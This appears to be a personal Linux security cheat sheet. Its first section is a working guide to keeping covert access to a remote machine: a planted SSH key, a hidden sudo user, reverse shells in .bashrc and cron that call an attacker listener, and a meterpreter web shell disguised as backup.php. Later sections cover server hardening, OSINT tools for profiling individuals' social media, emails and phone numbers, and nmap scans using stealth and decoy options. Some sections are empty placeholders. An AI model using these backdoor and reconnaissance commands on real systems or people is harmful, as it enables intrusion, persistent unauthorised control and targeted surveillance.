## Linux Security :

 Maintain remote access / backdoor to remote systems: 
<table style="width:100%" >



<tr>
<th>command</th>
<th>description <br /></th>
<th>reference <br /></th>
</tr>

<tr>
<th>maintain access</th>
<td>generate ssh key & maintain backdoor <br /></td>
<td>$ ssh-keygen -t rsa <br />
> /root/.ssh/godseye (name it godseye and put it in root) <br />
§ ls <br />
$ cat godseye <br />
$ cat godseye.pub <br />
$ ssh-copy-id -i godseye.pub user@ip <br />
$ ssh -i godseye user@ip <br />
$ sudo su <br />
$ cd .ssh/ <br />
$ ls <br />
$ cat authorized_keys <br /></td>
</tr>


<tr>
<th>ssh configuration</th>
<td>modify ssh configuration<br /></td>
<td>$ nano /etc/ssh/sshd_config (RSAAuthentication should be yes to login without password)<br /></td>
</tr>

<tr>
<th>adding a sneaky user</th>
<td>Adding a sneaky user in remote<br /></td>

<td>$ sudo su<br />
$ cd .. (go to home folder)<br />
$ ls<br />
$ useradd -m -s /bin/bash ftp<br />
$ usermod -aG sudo ftp<br />
$ passwd ftp<br />
$ ssh ftp@ip<br /></td>
</tr>

<tr>
<th>bashrc profile</th>
<td>modify ssh configuration<br /></td>
<td>$ ssh ftp@ip<br />
$ cd .. (go to home folder)<br />
$ nano user/.bashrc<br />
$ sh -i >& /dev/tcp/192.168.177.45/9000 0>&1 (put in a sneaky command)<br />
$ nc -lvp 9000 (from local system and anytime a user logs into remote we get an ip)<br />
</td>
</tr>

<tr>
<th>cron tab in remote machine</th>
<td>getting a cron tab in remote machine to get a backdoor<br /></td>
<td>
$ sudo su (in remote)<br />
$ crontab -e (type '2' for nano)<br />
$ ***** /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.177.45/9000 0>&1 (add this cronjob)<br />
$ nc -nlvp 9000 (in local use netcat and we get a connection as root #)<br />
</td>
</tr>

<tr>
<th>use metasploit to get persistence in a system</th>
<td>webshell using msfvenom<br /></td>
<td>$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.177.45 LPORT=9001 -e php/base64 -f raw shell.php (create a web shell)<br />
$ ls <br />
$ nano shell.php <br />
$ create php code and $ cat shell.php (copy the code)<br />
$ sudo su (in remote) <br />
$ cd /var/www/html/ <br />
$ ls <br />
$ nano backup.php (paste the code)<br />
$ nano /etc/sudoers (in USER PRIVILEDGES add 'www-data ALL=(ALL:ALL) ALL for web server) <br />
$ passwd www-data (www-data user got access)<br />
$ msfconsole (in local) <br />
> use  multi/handler <br />
> set payload php/meterpreter/reverse_tcp <br />
> set lhost 192.168.177.45 <br />
> set lport 9001 <br />
> run <br />
$ curl 192.168.177.48/backup.php (from local shell)<br />
We get a meterpreter shell to remote host:<br />
> whoami <br />
</td>
</tr>

</table>

### Ways to secure a linux server:


<table style="width:100%" >

<tr>
<th>command</th>
<th>description <br /></th>
<th>reference <br /></th>
</tr>

<tr>
<th>Enable Automatic Updates</th>
<td>Automatic updates and security patches of applications<br /></td>
<td>$ apt update<br />
$ apt dist-upgrade<br />
$ apt install unattended-upgrades<br />
$ dpkg-reconfigure --priority=low unattended-upgrades ( hit YES) <br />
</td>
</tr>

<tr>
<th>Limiting User Account</th>
<td>Avoid logging in as root<br /></td>
<td>$ adduser skk<br />
$ usermod -aG sudo skk (add skk to sudo group)<br />
$ logout <br />
$ ssh skk@ip <br />
skk$ sudo adduser saikia (we just got sudo power via skk) <br />
</td>
</tr>

<tr>
<th>Authentication Key Pair over Passwords</th>
<td>Public Key and Private Key<br /></td>
<td>$ mkdir ~/.ssh && chmod 700 ~/.ssh<br />
$ ssh-keygen -b 4096 (generating the public private key pair in localhost)<br />
$ cd .ssh<br />
$ ls <br />
$ scp $env:USERPROFILE/.ssh/id_rsa.pub user@ip:~/.ssh/authorized_keys (Windows only) <br />
$ ssh-copy-id user@ip <br />
$  scp ~/.ssh/id_rsa.pub user@ip:~/.ssh/authorized_keys (linux only) <br />
</td>
</tr>

<tr>
<th>Lockdown Logins</th>
<td>no passwords across the board<br /></td>
<td>$ sudo nano /etc/ssh/sshd_config <br />
$ (change port no in the ssh config file. port 22 is used by ssh by default and we can change that by configuring the config file : remove '#'(uncomment) and in config file: <br />Port 717<br />AddressFamily inet<br />PermitRootLogin no<br />PasswordAuthentication no ) <br />
$ sudo systemctl restart sshd <br />
$ ssh user@ip -p 717 (I can login via the new port)<br />
</td>
</tr>

<tr>
<th>Firewall it up!</th>
<td>Check ports and configure firewall<br /></td>
<td>$ sudo ss -tupln<br />
$ ufw (uncomplicated firewall)<br />
$ sudo apt install ufw <br />
$ sudo ufw status <br />
$ sudo ufw allow 717 (update firewall for custom port) <br />
$ sudo ufw enable <br />
$ sudo apt install apache2 <br />
$ sudo systemctl start apache2 <br />
$ sudo ss -tupln <br />
$ ping ip -t (to check if server is up) <br />
$ sudo nano /etc/ufw/before.rules (block ping to protect servers) <br />
> edit & add in: <br />
> #ok icmp codes for INPUT <br />
> A ufw-before-input -p icmp --icmp-type echo-request -j DROP<br />
$ sudo ufw reload<br />
$ sudo reboot (server is invisible to pings now)<br />
</td>
</tr>
</table>

### OSINT (Information Gathering) from Social Media:


<table style="width:100%" >

<tr>
<th>command</th>
<th>description <br /></th>
<th>reference <br /></th>
</tr>

<tr>
<th>Twitter OSINT</th>
<td>twint (twitter intelligence)<br /></td>
<td>
$ apt install git <br />
$ apt install python3 <br />
$ apt install python3-pip <br />
$ git clone --depth=1 https://github.com/twintproject/twint.git <br />
$ cd twint (twint can also be imported in python)<br />
$ pip3 install . -r requirements.txt<br />
$ twint -u florist_notes<br />
$ twint -h (list all switches you can use)<br />
$ twint -u florist_notes --limit 20 (last 20 tweets)<br />
$ twint -u florist_notes -s "anime" (search through tweets)<br />
$ twint -u florist_notes -s "book" -o book.json --json (output to a file)<br />
$ twint -u 3blue1brown --min-likes 100 <br />
$ twint -u 3blue1brown --since 2021-04-28 <br />
$ twint -u 3blue1brown --year 2018 <br />
$ twint -u 3blue1brown --year 2018 --images <br />
$ twint -s coffee --near hamburg --Since 2021-04-21 --min-likes 15 (search tweets with switches)<br />
$ twint -s "sun" --since 2021-04-28 -g="53.5488, 9.9872, 20km" (lat lon radius) <br />
In Python:<br />

```python
import twint

search = input("What are you searching for?")
city = input("Where ?")

c = twint.Config()
c.Search = search
c.Near = city
c.Limit = 20
c.Populer_tweets = True

twint.run.Search(c)
```

who ever tweets at @florist_notes today:

```python
import twint
from datetime import datetime
today = datetime.now().strftime('%Y-%m-%d')
c = twint.Config()
c.To = "florist_notes"
c.Since = today
c.Hide_output = True
c.Store_object = True

twint.run.Search(c)

tweets = twint.output.tweets_list

mypeople = []

for tweet in tweets:
    mypeople.append(('{}'.format(tweet.username)))

print(mypeople)

for user in mypeople:
    c = twint.Config()
    c.Username = user
    c.Limit = 20
    twint.run.Search(c)

```
<br /></td>
</tr>

<tr>
<th>Instagram OS!NT</th>
<td>OS!NT on Instagram account<br /></td>
<td>
$ git clone https://github.com/Datalux/Osintgram <br />
$ cd Osintgram <br />
$ pip3 install -r requirements.txt<br />
$ mkdir config <br />
$ cd config <br />
$ echo "username" > username.conf (dummy username acc)<br />
$ echo "supersecretpassword" > pw.conf<br />
$ echo "{}" > settings.json <br />
In Osintgram$ :<br />
$ python3 main.py medialab <br />

We will be in Osintgram console : <br />

$ list <br />
$ stories (download stories)<br />
$ xdg-open sample.jpg (image viewer) <br />
$ fwingsemail (get emails for users followed by the target) <br />
$ addrs (get all registered addresses for target photos) <br />
<br /></td>
</tr>

<tr>
<th>NMap for network vulnerabilities</th>
<td>network vulnerabilities with nmap and nmap scripting engine - 

[NSE](https://nmap.org/book/man-nse.html). Can change speed of scanning to avoid detection.<br /></td>
<td>
$ nmap -sP 10.7.1.0/24 (number of hosts are up)<br />
$ sudo nmap -sT -p 80, 443 10.7.1.0/24  (check for open ports, usually 80 or 443 ports are oprn in web server, T = TCP Connect, <ids in firewall can detect this 3 way handshake>) <br />
$ sudo nmap -sS -p 80, 443 10.7.1.0/24 (S = stealthy, to avoid intrusion detection (IDS), no complete 3 way handshake) <br />
$ man nmap <br />
$ sudo nmap -O 10.7.1.226 (OS detection)<br />
$ sudo nmap -A 10.7.1.226 (detailed) <br />
$ sudo nmap -sS -D  10.7.1.80 10.7.1.226 (will put a decoy ip address - cover your tracks) <br />
$ sudo nmap --script vuln 10.7.1.226 (find vulnerabilities)
<br /></td>
</tr>

<tr>
<th>find info on phone numbers with PhoneInfoga</th>
<td>Find info on phone numbers<br /></td>
<td>
$ docker pull sundowndev/phoneinfoga:latest <br />
$ docker run -it sundowndev/phoneinfoga scan -n 13526006900 <br />
$ docker run -it -p 8080:8080 sundowndev/phoneinfoga serve -p 8080 (to serve web UI at port 8080) <br />
<br /></td>
</tr>

<tr>
<th>find social media accounts with Sherlock</th>
<td>sherlock<br /></td>
<td>
$ git clone https://github.com/sherlock-project/sherlock.git <br />
$ cd sherlock <br />
$ python3 -m pip install -r requirements.txt <br />
<br /></td>
</tr>

<tr>
<th>x</th>
<td>x<br /></td>
<td>x<br /></td>
</tr>

<tr>
<th>x</th>
<td>x<br /></td>
<td>x<br /></td>
</tr>


</table>

### Hacking with Linux:


<table style="width:100%" >

<tr>
<th>command</th>
<th>description <br /></th>
<th>reference <br /></th>
</tr>

<tr>
<th>x</th>
<td>x<br /></td>
<td>x<br /></td>
</tr>
</table>